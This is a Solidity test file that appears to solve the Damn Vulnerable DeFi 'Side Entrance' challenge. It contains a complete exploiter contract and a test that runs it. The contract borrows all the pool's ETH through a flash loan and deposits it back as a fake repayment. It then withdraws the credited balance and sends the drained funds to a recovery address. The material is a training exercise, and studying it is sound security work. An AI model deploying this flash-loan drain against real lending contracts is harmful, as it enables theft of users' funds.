// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploiter {

    // Reference to the vulnerable lending pool
    SideEntranceLenderPool public pool;

    // Address where stolen funds will be sent
    address public recovery;

    // Constructor initializes the pool and attacker’s recovery address
    constructor(SideEntranceLenderPool _pool, address _recovery){
        pool = _pool;           // Store pool contract address
        recovery = _recovery;   // Store attacker’s wallet
    } 

    // Entry point to start the exploit
    function startAttack() public{

        // Step 1: Take a flash loan of ALL ETH in the pool
        pool.flashLoan(address(pool).balance);

        // Step 2: Withdraw the deposited balance (exploit)
        pool.withdraw();
    } 

    // This function is called by the pool during flashLoan
    function execute() public payable{

        // Instead of repaying normally, deposit the borrowed ETH back
        // This increases our internal balance in the pool
        pool.deposit{value: msg.value}();
    }

    // This function is triggered when the contract receives ETH
    receive() external payable{

        // Transfer all received ETH to the recovery (attacker) address
        payable(recovery).transfer(address(this).balance);
    } 
} 

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
function test_sideEntrance() public checkSolvedByPlayer {

    // Step 1: Deploy the attacker contract
    // - Pass the vulnerable pool address
    // - Pass the recovery address (where stolen ETH will go)
    SideEntranceExploiter exploiter = new SideEntranceExploiter(pool, recovery);

    // Step 2: Trigger the attack
    // This will:
    //   1. Take a flash loan of all ETH from the pool
    //   2. Deposit it back during execute() (fake repayment)
    //   3. Pass the pool's balance check
    //   4. Withdraw the deposited amount
    //   5. Transfer all ETH to the recovery address
    exploiter.startAttack(); 
}

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
